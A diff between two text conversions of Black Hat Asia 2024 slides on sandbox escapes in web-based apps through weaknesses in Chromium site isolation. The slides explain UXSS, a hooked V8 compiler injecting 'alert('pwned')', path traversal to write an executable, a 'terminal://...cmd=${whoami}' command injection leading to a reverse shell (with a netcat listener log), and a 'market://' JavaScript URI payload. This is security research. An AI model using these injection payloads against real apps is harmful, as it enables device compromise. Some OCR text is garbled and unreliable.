@@ -1,6 +1,6 @@
 ---
-title: "Isolation Perspective"
-speakers: ["Bohan Liu", "Haibin Shi-The Hole in Sandbox Escape Modern Web-Based App Sandbox From Site"]
+title: "The Hole in Sandbox Escape Modern Web-Based App Sandbox From Site-Isolation Perspective"
+speakers: ["Bohan Liu", "Haibin Shi"]
 conference: "Black Hat"
 conference_full: "Black Hat ASIA 2024"
 edition: "ASIA"
@@ -8,19 +8,24 @@ year: 2024
 source_pdf: "BlackHat ASIA 2024-Slides/Bohan Liu & Haibin Shi-The Hole in Sandbox Escape Modern Web-Based App Sandbox From Site-Isolation Perspective.pdf"
 pages: 68
 sha256: "341adecf8fa4f1c44c856e556dd5948db53d3442b1155fe3824efa4376fb4958"
-text_chars: 43461
-ocr_pages: 4
+text_chars: 43474
+ocr_pages: 3
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 85.9
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-12T00:48:50Z"
+converted_at: "2026-08-12T04:46:47Z"
 ---
-# Isolation Perspective
+# The Hole in Sandbox Escape Modern Web-Based App Sandbox From Site-Isolation Perspective
 
-**Speakers:** Bohan Liu, Haibin Shi-The Hole in Sandbox Escape Modern Web-Based App Sandbox From Site  
+**Speakers:** Bohan Liu, Haibin Shi  
 **Conference:** Black Hat ASIA 2024  
 **Source:** `BlackHat ASIA 2024-Slides/Bohan Liu & Haibin Shi-The Hole in Sandbox Escape Modern Web-Based App Sandbox From Site-Isolation Perspective.pdf` (68 pages)
+
 
 ## Slide 1
 
@@ -175,7 +180,8 @@ UXSS in Browser
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 black hat
@@ -195,7 +201,6 @@ The Chrome Stable channel has been updated to 17.0.963.78 on Wind Mac, Linux and
 release fixes issues with Flash games and videos, along with the security fix listed below.
 Security fixes and rewards
 Congratulations again to community member Sergey Glazunov for the first submission to Pwnium!
-=
 -[ IM $60,000] [117226] [117230] Critical CVE-2011-3046: UXSS and bad history
 navigation. Credit to Sergey Glazunov
 1 g
@@ -218,37 +223,37 @@ CVE-2019-8813: an anonymous researcher
 
 ###### **What stops us from injecting code from other domains?**
 
-```
+\```
 <!DOCTYPEhtml>
 <html>
-```
+\```
 
-```
+\```
 <head>
-```
+\```
 
-```
+\```
 <title>DEMO</title>
-```
+\```
 
 - `</head>`
 
-```
+\```
 <body>
-```
+\```
 
-```
+\```
 <iframeid="myFrame"width="500"height="800"
 src="https://xlab.tencent.com"></iframe>
-```
+\```
 
 - `<!-- <iframe id="myFrame" width="500" height="800"`
 
 - `src="test.html"></iframe> -->`
 
-```
+\```
 <script>
-```
+\```
 
 Access blocked due to **SOP**
 
@@ -258,17 +263,17 @@ Access blocked due to **SOP**
 
 - `(script)); });`
 
-```
+\```
 </script>
-```
+\```
 
-```
+\```
 </body>
-```
+\```
 
-```
+\```
 </html>
-```
+\```
 
 # BHASIA @BlackHatEvents
 
@@ -349,48 +354,48 @@ https://msrndcdn360.blob.core.windows.net/bluehat/bluehatil/2022/assets/doc/Forg
 
 - **=> Modify data in Renderer Process to bypass check.**
 
-```
+\```
 boolDOMWindow::isInsecureScriptAccess(DOMWindow&activeWindow, constString&urlString)
 {
-```
+\```
 
-```
+\```
 //[...]
-```
+\```
 
-```
+\```
 if(activeWindow.document()->securityOrigin().canAccess(document()->securityOrigin()))
 returnfalse;
-```
+\```
 
 1. Overwrite **_m_universalAccess_** in SecurityOrigin of the domain
 
-```
+\```
 //[...]
 printErrorMessage(crossDomainAccessErrorMessage(...));
 }
-```
+\```
 
 - ->  bypass Check of Cross-domain data access
 
    - -> Inject XSS payload into iframe
 
-```
+\```
 boolFrameLoader::shouldInterruptLoadForXFrameOptions(...)
 {
-```
+\```
 
-```
+\```
 //[...]
-```
+\```
 
-```
+\```
 XFrameOptionsDispositiondisposition = parseXFrameOptionsHeader(content);
-```
+\```
 
-```
+\```
 switch(disposition) {
-```
+\```
 
 2. Overwrite protocol, host, port in SecurityOrigin of the domain
 
@@ -398,40 +403,40 @@ switch(disposition) {
 
       - -> Make any site can be loaded in iframe
 
-```
+\```
 caseXFrameOptionsSameOrigin: {
-```
+\```
 
-```
+\```
 // Check if the parent is the same origin
-```
+\```
 
-```
+\```
 if(!origin->isSameSchemeHostPort(topFrame.document()->securityOrigin()))
 returntrue;
-```
+\```
 
-```
+\```
 returnfalse;
-```
+\```
 
-```
+\```
 }
 caseXFrameOptionsDeny:
-```
+\```
 
-```
+\```
 // Always interrupt load
 returntrue;
-```
+\```
 
-```
+\```
 //[...]
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 https://msrndcdn360.blob.core.windows.net/bluehat/bluehatil/2022/assets/doc/Forget%20the%20Sandbox%20Escape%20Abusing%20Browsers%20from%20Code%20Execution.pdf
 
@@ -523,32 +528,32 @@ https://www.usenix.org/system/files/sec19-reis.pdf
 
 **How to trace code ?** → NavigationRequest::StartNavigation
 
-```
+\```
 voidNavigationRequest::StartNavigation() {
 // [...]
-```
+\```
 
-```
+\```
 if(associated_rfh_type_ != AssociatedRenderFrameHostType::NONE) {
 RenderFrameHostImpl* navigating_frame_host=
-```
+\```
 
-```
+\```
 associated_rfh_type_ == AssociatedRenderFrameHostType::SPECULATIVE
-```
+\```
 
 - `? frame_tree_node_->render_manager()->speculative_frame_host()`
 
-```
+\```
 : frame_tree_node_->current_frame_host();
 SetExpectedProcess(navigating_frame_host->GetProcess());
-```
+\```
 
-```
+\```
 }
 // [...]
 }
-```
+\```
 
 # BHASIA @BlackHatEvents
 
@@ -556,32 +561,32 @@ SetExpectedProcess(navigating_frame_host->GetProcess());
 
 `RenderFrameHostManager::GetFrameHostForNavigation( NavigationRequest* request, BrowsingContextGroupSwap* browsing_context_group_swap, std::string* reason) {` How is Site Isolation implemented?
 
-```
+\```
 SiteInstanceImpl* current_site_instance=
-```
+\```
 
-```
+\```
 render_frame_host_->GetSiteInstance();
-```
+\```
 
 **How to trace code ?** → NavigationRequest::StartNavigation
 
-```
+\```
 boolis_same_site=
-```
+\```
 
-```
+\```
 render_frame_host_->IsNavigationSameSite(request->GetUrlInfo());
-```
+\```
 
-```
+\```
 IsSameSiteGetteris_same_site_getter(is_same_site);
 scoped_refptr<SiteInstanceImpl> dest_site_instance=
 GetSiteInstanceForNavigationRequest(request, is_same_site_getter,
 browsing_context_group_swap, reason);
-```
+\```
 
-```
+\```
 IsSameSiteGetteris_same_site_getter(is_same_site);
 voidNavigationRequest::StartNavigation() {
 scoped_refptr<SiteInstanceImpl> dest_site_instance=
@@ -592,64 +597,64 @@ RenderFrameHostImpl* navigating_frame_host=
 associated_rfh_type_ == AssociatedRenderFrameHostType::SPECULATIVE// (see also https://crbug.com/1107269).
 ? frame_tree_node_->render_manager()->speculative_frame_host()RenderFrameHostImpl* parent = frame_tree_node_->parent();
 DCHECK(!parent ||
-```
+\```
 
-```
+\```
 // A subframe should always be in the same BrowsingInstanceas the parent
 // (see also https://crbug.com/1107269).
-```
+\```
 
-```
+\```
 : frame_tree_node_->current_frame_host();
-```
+\```
 
-```
+\```
 dest_site_instance->IsRelatedSiteInstance(parent->GetSiteInstance()));
-```
+\```
 
-```
+\```
 SetExpectedProcess(navigating_frame_host->GetProcess());
-```
+\```
 
-```
+\```
 }
 // [...]
 }
-```
+\```
 
-```
+\```
 // The SiteInstancedetermines whether to switch RenderFrameHostor not.
 booluse_current_rfh=current_site_instance== dest_site_instance;
 //[...]
 //[...]
 if(use_current_rfh) {
-```
+\```
 
-```
+\```
 request->SetAssociatedRFHType(
-```
+\```
 
-```
+\```
 NavigationRequest::AssociatedRenderFrameHostType::CURRENT);
 //[...]
 } else{
 //[...]
-```
+\```
 
-```
+\```
 navigation_rfh= speculative_render_frame_host_.get();
 request->SetAssociatedRFHType(
-```
+\```
 
-```
+\```
 NavigationRequest::AssociatedRenderFrameHostType::SPECULATIVE);
 //[...]
-```
+\```
 
-```
+\```
 }
 //[...]
-```
+\```
 
 # BHASIA @BlackHatEvents
 
@@ -657,28 +662,28 @@ NavigationRequest::AssociatedRenderFrameHostType::SPECULATIVE);
 
 `RenderFrameHostManager::GetFrameHostForNavigation( NavigationRequest* request, BrowsingContextGroupSwap* browsing_context_group_swap, std::string* reason) {` How is Site Isolation implemented?
 
-```
+\```
 SiteInstanceImpl* current_site_instance=
 scoped_refptr<SiteInstanceImpl> BrowsingInstance::GetSiteInstanceForURLHelper(
 render_frame_host_->GetSiteInstance();
-```
+\```
 
 `const UrlInfo& url_info, bool is_same_site =` **How to trace code ?** → NavigationRequest::StartNavigation `bool allow_default_instance) { render_frame_host_->IsNavigationSameSite(request->GetUrlInfo()); const SiteInfo site_info = ComputeSiteInfoForURL(url_info); auto i = site_instance_map_.find(site_info); IsSameSiteGetter is_same_site_getter(is_same_site); void NavigationRequest::StartNavigation() {if (i != site_instance_map_.end()) scoped_refptr<SiteInstanceImpl>` **`dest_site_instance`** `= // [...] return i->second; GetSiteInstanceForNavigationRequest(request, is_same_site_getter, if (associated_rfh_type_ != AssociatedRenderFrameHostType::NONE) { browsing_context_group_swap, reason); // Check to see if we can use the default SiteInstance for sites that don't` **`RenderFrameHostImpl`** `// need to be isolated in their own process.* navigating_frame_host = // A subframe should always be in the same BrowsingInstance as the parent associated_rfh_type_ == AssociatedRenderFrameHostType::SPECULATIVEif (allow_default_instance && // (see also https://crbug.com/1107269).` **`SiteInstanceImpl::CanBePlacedInDefaultSiteInstance(`** `? frame_tree_node_->render_manager()->speculative_frame_host()RenderFrameHostImpl* parent = frame_tree_node_->parent();` **`isolation_context_, url_info.url, site_info))`** `{ DCHECK(!parent || scoped_refptr<SiteInstanceImpl> site_instance: frame_tree_node_->current_frame_host();= dest_site_instance->IsRelatedSiteInstance(parent->GetSiteInstance())); SetExpectedProcess(navigating_frame_host->GetProcess());default_site_instance_.get(); if (!site_instance) { } // The SiteInstance determines whether to switch RenderFrameHost or not. site_instance = new SiteInstanceImpl(this); bool use_current_rfh =` **`current_site_instance == dest_site_instance`** `; // [...] //[...] } // Note: |default_site_instance_| will get set inside this call//[...]`
 
 - `// via RegisterSiteInstance().`
 
-```
+\```
 if(use_current_rfh) {
 request->SetAssociatedRFHType(
-```
+\```
 
-```
+\```
 site_instance->SetSiteInfoToDefault(site_info.storage_partition_config());
 DCHECK_EQ(default_site_instance_, site_instance.get());
 }
-```
+\```
 
-```
+\```
 NavigationRequest::AssociatedRenderFrameHostType::CURRENT);
 //[...]
 // Add |site_info| to the set so we can keep track of all the sites the
@@ -694,71 +699,71 @@ NavigationRequest::AssociatedRenderFrameHostType::SPECULATIVE);
 returnnullptr;;
 }
 //[...]
-```
+\```
 
-```
+\```
 // the default SiteInstancehas been returned for.
 site_instance->AddSiteInfoToDefault(site_info);
 returnsite_instance;
 }
 returnnullptr;;
 }
-```
+\```
 
 # BHASIA @BlackHatEvents
 
 ## Slide 20
 
-```
+\```
 // static
-```
+\```
 
-```
+\```
 boolSiteIsolationPolicy::UseDedicatedProcessesForAllSites() {
 if(base::CommandLine::ForCurrentProcess()->HasSwitch(
 switches::kSitePerProcess)) {
 returntrue;
-```
+\```
 
 ##### How is Site Isolation implemented?
 
-```
+\```
 }
-```
+\```
 
 **When to reuse SiteInstance?**
 
-```
+\```
 if (IsSiteIsolationDisabled(SiteIsolationMode::kStrictSiteIsolation))
 return false;
-```
+\```
 
 - `bool SiteInfo::RequiresDedicatedProcess( const IsolationContext& isolation_context) const {`
 
 - `DCHECK_CURRENTLY_ON(BrowserThread::UI);`
 
-```
+\```
 DCHECK(isolation_context.browser_or_resource_context());
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 // The switches above needs to be checked first, because if the
 // ContentBrowserClientconsults a base::Feature, then it will activate the
 // field trial and assigns the client either to a control or an experiment
 // group -such assignment should be final.
-```
+\```
 
-```
+\```
 returnGetContentClient() &&
-```
+\```
 
-```
+\```
 GetContentClient()->browser()->ShouldEnableStrictSiteIsolation();
-```
+\```
 
 - `// If --site-per-process is enabled, site isolation is enabled`
 
@@ -766,15 +771,15 @@ GetContentClient()->browser()->ShouldEnableStrictSiteIsolation();
 
    - `if (SiteIsolationPolicy::` **`UseDedicatedProcessesForAllSites`** `()) return true;`
 
-```
+\```
 // [...]
-```
+\```
 
 - `return false;`
 
-```
+\```
 }
-```
+\```
 
 # BHASIA @BlackHatEvents
 
@@ -788,7 +793,7 @@ GetContentClient()->browser()->ShouldEnableStrictSiteIsolation();
 
 `// static bool SiteIsolationPolicy::UseDedicatedProcessesForAllSites() { if (base::CommandLine::ForCurrentProcess()->HasSwitch( switches::kSitePerProcess)) { return true;` How is Site Isolation implemented? `}` **When to reuse SiteInstance?** `if (` **`IsSiteIsolationDisabled(SiteIsolationMode::kStrictSiteIsolation)`** `) return false; // The switches above needs to be checked first, because if the bool SiteInfo::RequiresDedicatedProcess( // ContentBrowserClient consults a base::Feature, then it will activate the // field trial and assigns the client either to a control or an experiment const IsolationContext& isolation_context) const { // group - such assignment should be final. DCHECK_CURRENTLY_ON(BrowserThread::UI); return GetContentClient() && DCHECK(isolation_context.browser_or_resource_context()); GetContentClient()->browser()->` **`ShouldEnableStrictSiteIsolation()`** `; } // If --site-per-process is enabled, site isolation is enabled everywhere. if (SiteIsolationPolicy::` **`UseDedicatedProcessesForAllSites`** `()) return true; // [...] return false; bool ContentBrowserClient::ShouldEnableStrictSiteIsolation() { }`
 
-```
+\```
 boolContentBrowserClient::ShouldEnableStrictSiteIsolation() {
 #if BUILDFLAG(IS_ANDROID)
 returnfalse;
@@ -796,7 +801,7 @@ returnfalse;
 returntrue;
 #endif
 }
-```
+\```
 
 **We can reuse the same process after navigation in Android!!!**
 
@@ -830,115 +835,115 @@ returntrue;
 
 ###### **Hook the code of JavaScript Compilation**
 
-```
+\```
 v8::MaybeLocal<v8::Script> CompileScriptInternal(
-```
+\```
 
-```
+\```
 v8::Isolate*isolate,
 ScriptState*script_state,
-```
+\```
 
-```
+\```
 MaybeLocal<Script> ScriptCompiler::Compile(Local<Context> context,
-```
+\```
 
-```
+\```
 Source* source,
 CompileOptionsoptions,
-```
+\```
 
-```
+\```
 NoCacheReasonno_cache_reason) {
-```
+\```
 
-```
+\```
 Utils::ApiCheck(
-```
+\```
 
-```
+\```
 !source->GetResourceOptions().IsModule(), "v8::ScriptCompiler::Compile",
 "v8::ScriptCompiler::CompileModulemust be used to compile modules");
 autoi_isolate= context->GetIsolate();
-```
+\```
 
-```
+\```
 MaybeLocal<UnboundScript> maybe =
-```
+\```
 
-```
+\```
 CompileUnboundInternal(i_isolate, source, options, no_cache_reason);
 Local<UnboundScript> result;
-```
+\```
 
-```
+\```
 if(!maybe.ToLocal(&result)) returnMaybeLocal<Script>();
 v8::Context::Scope scope(context);
-```
+\```
 
-```
+\```
 returnresult->BindToCurrentContext();
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 **Hook**
 
-```
+\```
 constClassicScript&classic_script,
-```
+\```
 
-```
+\```
 v8::ScriptOriginorigin,
-```
+\```
 
-```
+\```
 v8::ScriptCompiler::CompileOptionscompile_options,
-```
+\```
 
-```
+\```
 v8::ScriptCompiler::NoCacheReasonno_cache_reason,
-```
+\```
 
-```
+\```
 std::optional<inspector_compile_script_event::V8ConsumeCacheResult>*
 cache_result) {
-```
+\```
 
-```
+\```
 v8::Local<v8::String> code = V8String(isolate, classic_script.SourceText());
-```
+\```
 
-```
+\```
 // TODO(kouhei): Plumb the ScriptStateinto this function and replace all
 // Isolate->GetCurrentContextin this function with ScriptState->GetContext.
 if(ScriptStreamer* streamer = classic_script.Streamer()) {
-```
+\```
 
-```
+\```
 if(v8::ScriptCompiler::StreamedSource* source =
-```
+\```
 
-```
+\```
 streamer->Source(v8::ScriptType::kClassic)) {
-```
+\```
 
-```
+\```
 // Final compile call for a streamed compilation.
 // Streaming compilation may involve use of code cache.
 // TODO(leszeks): Add compile timer to streaming compilation.
 returnv8::ScriptCompiler::Compile(script_state->GetContext(), source,
 code, origin);
-```
+\```
 
-```
+\```
 }
 }
 //[...]
 }
-```
+\```
 
 # BHASIA @BlackHatEvents
 
@@ -948,96 +953,96 @@ code, origin);
 
 ###### **Hook the code of JavaScript Compilation**
 
-```
+\```
 v8::MaybeLocal<v8::Script> CompileScriptInternal(
 v8::Isolate*isolate,
 ScriptState*script_state,
-```
+\```
 
-```
+\```
 MaybeLocal<Script> ScriptCompiler::Compile(Local<Context> context,
 Source* source,
 CompileOptionsoptions,
 NoCacheReasonno_cache_reason) {
-```
+\```
 
-```
+\```
 Utils::ApiCheck(
-```
+\```
 
-```
+\```
 !source->GetResourceOptions().IsModule(), "v8::ScriptCompiler::Compile",
 "v8::ScriptCompiler::CompileModulemust be used to compile modules");
 autoi_isolate= context->GetIsolate();
-```
+\```
 
-```
+\```
 MaybeLocal<UnboundScript> maybe =
-```
+\```
 
-```
+\```
 CompileUnboundInternal(i_isolate, source, options, no_cache_reason);
 Local<UnboundScript> result;
 if(!maybe.ToLocal(&result)) returnMaybeLocal<Script>();
 inlinev8::Context::Sv8::Locope scope(context);al<v8::String> Evil_V8String(v8::Isolate*isolate,
 returnresult->BindToCurrentContext();constParkableString&string)
-```
+\```
 
-```
+\```
 }
 {
-```
+\```
 
-```
+\```
 if(some_special_condition){
 return V8String(isolate, "alert('pwned')");
 }else{
 returnV8String(isolate, string);
 }
 }
-```
+\```
 
-```
+\```
 constClassicScript&classic_script,
 v8::ScriptOriginorigin,
 v8::ScriptCompiler::CompileOptionscompile_options,
-```
+\```
 
-```
+\```
 v8::ScriptCompiler::NoCacheReasonno_cache_reason,
-```
+\```
 
-```
+\```
 std::optional<inspector_compile_script_event::V8ConsumeCacheResult>*
 cache_result) {
-```
+\```
 
-```
+\```
 v8::Local<v8::String> code = V8String(isolate, classic_script.SourceText());Evil_V8String(isolate, classic_script.SourceText());
-```
+\```
 
-```
+\```
 // TODO(kouhei): Plumb the ScriptStateinto this function and replace all
 // Isolate->GetCurrentContextin this function with ScriptState->GetContext.
 if(ScriptStreamer* streamer = classic_script.Streamer()) {
 if(v8::ScriptCompiler::StreamedSource* source =
-```
+\```
 
-```
+\```
 streamer->Source(v8::ScriptType::kClassic)) {
 // Final compile call for a streamed compilation.
 // Streaming compilation may involve use of code cache.
 // TODO(leszeks): Add compile timer to streaming compilation.
 returnv8::ScriptCompiler::Compile(script_state->GetContext(), source,
 code, origin);
-```
+\```
 
-```
+\```
 }
 }
 //[...]
 }
-```
+\```
 
 # BHASIA @BlackHatEvents
 
@@ -1055,10 +1060,10 @@ code, origin);
 
 4
 
-```
+\```
 Victims open
 attackers’ site
-```
+\```
 
 ###### **`Patch the code Via Renderer RCE`**
 
@@ -1353,48 +1358,48 @@ Path traversal when writing files: **../../X.exe?**
 
 ###### **Remote Code Execution**
 
-```
+\```
 BOOL decrypt(constwchar_t*inputFilePath, constwchar_t*
 outputFilePath, constchar*key, Function *cb)
 {
-```
+\```
 
-```
+\```
 HANDLE hInputFile= CreateFile(inputFilePath, GENERIC_READ, 0,
 NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 std::ofstreamoutputFile(outputFilePath, std::ios::binary);
 DWORD fileSize= GetFileSize(hInputFile, NULL);
 BYTE* inputData= newBYTE[fileSize];
 DWORD bytesRead;
-```
+\```
 
-```
+\```
 if(!ReadFile(hInputFile, inputData, fileSize, &bytesRead, NULL))
 {
 cb();
 returnFALSE;
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 CloseHandle(hInputFile);
 DecryptImpl(inputData);
 outputFile.write(reinterpret_cast<const char*>(inputData),
 bytesRead);
-```
+\```
 
-```
+\```
 outputFile.close();
 cb();
 returnTRUE;
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 # BHASIA @BlackHatEvents
 
@@ -1408,14 +1413,14 @@ Visible on site
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 2)
 black hat
 ASIA 2024
 Demo for Web-based APP on
-x... =
 ) > Program Files (x86)
 Visible on site
 Commit Charge: 72.72% Pr
@@ -1570,22 +1575,18 @@ like this, **terminal://xlabxlab?cmd=${whoami}** So, we can reverse shell by dow
 
 # BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 76/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
 ASIA 2024
 » Python =m SimpleHTTPSe | © p4nda@PWNDALIU-MB1 yay nc -l 7878
 id
-/® port 8@ ...
-uid=10278(u0_a278) gid=10278(u@_a278) groups=10278(u@_a278), 3003(inet) ,99
 6/Oct/2021 20:55:55] "GET / HTTP/1.1" 200 - 97 (everybody) ,20278(u@_a278_cache) ,50278(all_a278) context=u: r:untrusted_
 6/O0ct/2021 20:55:55] "GET /conf.js HTTP/1.1" 200 - app_27:s0:c22,c257,c512,c768
 L6/O0ct/2021 20:55:56] code 404, message File not foun whoami
 u@_a278
 16/0ct/2®21 20:55:56] “GET /favicon.ico HTTP/1.1"
-404 )\ip a |ff
-L16/Oct/2021 20:56:01).
 “GET /exp.html HTTP/1.1" 200 -
 {16/0ct/2021 20:56:06) "GET /busybox HTTP/1.1" 200 -
 ```
@@ -1801,17 +1802,6 @@ market://web?url=JavaScript:document.write(evilcode)
 ##### Demo
 
 # BHASIA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-2)
-black hat
-ASIA 2024
-Demo
-1537
-% 0
-```
 
 ## Slide 66
 
